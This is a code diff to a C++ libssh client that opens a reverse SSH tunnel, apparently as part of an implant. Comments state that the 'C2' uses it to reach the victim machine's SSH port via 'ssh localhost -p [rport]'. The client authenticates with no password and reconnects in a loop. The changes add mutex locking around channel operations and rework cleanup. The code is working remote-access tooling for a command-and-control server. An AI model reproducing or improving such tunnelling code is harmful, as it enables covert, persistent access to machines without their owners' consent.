@@ -20,9 +20,16 @@
 #endif // _WIN32
 
 int SSHClient::should_terminate = 0;
+pthread_mutex_t SSHClient::mutex;
 
 SSHClient::SSHClient()
 {
+
+#ifdef _WIN32
+    InitializeCriticalSection(&mutex);
+#else
+    pthread_mutex_init(&mutex, NULL);
+#endif // _WIN32
 }
 
 int SSHClient::connect_to_local_service(int port)
@@ -54,7 +61,7 @@ int SSHClient::connect_to_local_service(int port)
 
 
 
-int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channel, int lport)
+int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channel, int lport, pthread_mutex_t* mutex)
 {
     int sockfd;
     int rc;
@@ -109,7 +116,10 @@ int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channe
             int tot_sent = 0;
             while (tot_sent < nbytes) {
                 //debug("Before ssh_channel_write. tot_sent=%d nbytes=%d\n", tot_sent, nbytes);
+                pthread_mutex_lock(mutex);
                 nwritten = ssh_channel_write(channel, buffer + tot_sent, nbytes - tot_sent);
+                pthread_mutex_unlock(mutex);
+                
                 //debug("After ssh_channel_write, nwritten=%d\n", nwritten);
                 if (nwritten == SSH_ERROR) {
                     debug("[DEBUG] ssh_channel_write: %s\n", ssh_get_error(session));
@@ -124,13 +134,19 @@ int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channe
         }
 
         //Next, we poll the channel
+        pthread_mutex_lock(mutex);
         rc = ssh_channel_poll(channel, 0);
+        pthread_mutex_unlock(mutex);
+
         //debug("ssh_channel_poll rc=%d\n", rc);
         //If there is anything to read then read it and write it to the socket
         if (rc != 0 && rc != SSH_ERROR) {
             //nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
             //debug("ssh_channel_read, sizeof(buffer) %d\n", sizeof(buffer));
+            pthread_mutex_lock(mutex);
             nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+            pthread_mutex_unlock(mutex);
+            
             if (nbytes == 0) {
                 if (ssh_channel_is_eof(channel) || !ssh_channel_is_open(channel)) {
                     close(sockfd);
@@ -162,25 +178,17 @@ int SSHClient::do_remote_forwarding_loop(ssh_session session, ssh_channel channe
                     }
                 }
             }
-            else {
-                /* Assume client has closed connection
-                   to rport on remote side */
-                close(sockfd);
-                return CLIENT_SENT_EOF;
-            }
         }
     }
     return SSH_OK;
 }
 
-void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport) {
-	int rc = do_remote_forwarding_loop(sess, chan, lport);
+void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport, pthread_mutex_t* mutex) {
+	int rc = do_remote_forwarding_loop(sess, chan, lport, mutex);
 	if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
 		debug("[OTCP] Terminate SSH channel\n");
 		ssh_channel_send_eof(chan);
 		ssh_channel_free(chan);
-		/*ssh_disconnect(sess);
-		ssh_free(sess);*/
 		return ;
 	}
 	else {
@@ -204,9 +212,10 @@ void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int 
  * lport:   port to forward to once tunnel established  // usually 22 for us 2222
  * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
  */
-int SSHClient::do_remote_forwarding(ssh_session sess, int lport, int rport) {
+int SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex) {
     debug("[OTCP] Opening port T:%d on server...\n", lport);
     int bounded_port = 0;
+    int ret = 0;
 #ifdef IS_DEBUG
 	int remote_liste_port = 1234;
 #else
@@ -215,9 +224,8 @@ int SSHClient::do_remote_forwarding(ssh_session sess, int lport, int rport) {
     auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &bounded_port);
     if (rc != SSH_OK) {
         debug("[DEBUG] failed: %s\n", ssh_get_error(sess));
-        ssh_disconnect(sess);
-        ssh_free(sess);
-        return -1;
+        ret = 1;
+        goto clean;
     }
     debug("Check port %d in remote server\n", bounded_port?bounded_port:remote_liste_port);
 
@@ -226,28 +234,33 @@ int SSHClient::do_remote_forwarding(ssh_session sess, int lport, int rport) {
         int dport = 0;	// The port bound on the server, here: 8080
         debug("[OTCP] Waiting for incoming connection...\n");
 
+
+        pthread_mutex_lock(mutex);
         chan = ssh_channel_accept_forward(sess, ACCEPT_FORWARD_TIMEOUT, &dport);
+        pthread_mutex_unlock(mutex);
         if (chan == NULL) {
-            if (ssh_is_connected(sess))
-                break;            
+            if (!ssh_is_connected(sess)) {
+                goto clean;
+            }
+
             debug("[DEBUG] failed: code: %d msg: %s\n", ssh_get_error_code(sess), ssh_get_error(sess));
             if (ssh_get_error_code(sess) != 0) {	/* Timed out */
-                ssh_disconnect(sess);
-                ssh_free(sess);
-                return -1;
+                ret = 1;
+                goto clean;
             }
             else {
                 continue;
             }
         }
         debug("\n[OTCP] Connection received\n");
-		std::thread(SSHClient::remote_forwading_thread, sess, chan, lport).detach();
+		std::thread(SSHClient::remote_forwading_thread, sess, chan, lport, mutex).detach();
 		//SSHClient::remote_forwading_thread(sess, chan, lport);   
     }
-
-    ssh_disconnect(sess);
+clean:
+    if (ssh_is_connected(sess))
+        ssh_disconnect(sess);
     ssh_free(sess);
-    return 1;
+    return ret;
 }
 
 
@@ -261,6 +274,8 @@ int SSHClient::run(const char* username, const char* host, int port)
 #endif // DEBUG
 
     int rc;
+    int ret = 0;
+   
 
     do 
     {
@@ -274,8 +289,7 @@ int SSHClient::run(const char* username, const char* host, int port)
 
         // Connect to server
         rc = ssh_connect(my_ssh_session);
-        if (rc != SSH_OK)
-        {
+        if (rc != SSH_OK){
             debug("Error connecting to %s: %s\n",
                 host,
                 ssh_get_error(my_ssh_session));
@@ -284,8 +298,7 @@ int SSHClient::run(const char* username, const char* host, int port)
         }
 
         rc = ssh_userauth_none(my_ssh_session, username);
-        if (rc != SSH_AUTH_SUCCESS)
-        {
+        if (rc != SSH_AUTH_SUCCESS){
             debug("Error authenticating with password: %s\n",
                 ssh_get_error(my_ssh_session));
             ssh_disconnect(my_ssh_session);
@@ -295,11 +308,11 @@ int SSHClient::run(const char* username, const char* host, int port)
 
 
         // do something
-        do_remote_forwarding(my_ssh_session, port, 1234);
+        do_remote_forwarding(my_ssh_session, port, &SSHClient::mutex);
     } while(!should_terminate); // When the clients disconnects we try to reconnect it again
-    ssh_disconnect(my_ssh_session);
-    ssh_free(my_ssh_session);
-    
+
+clean:
+    pthread_mutex_destroy(&mutex);
 
     return 0;
 }
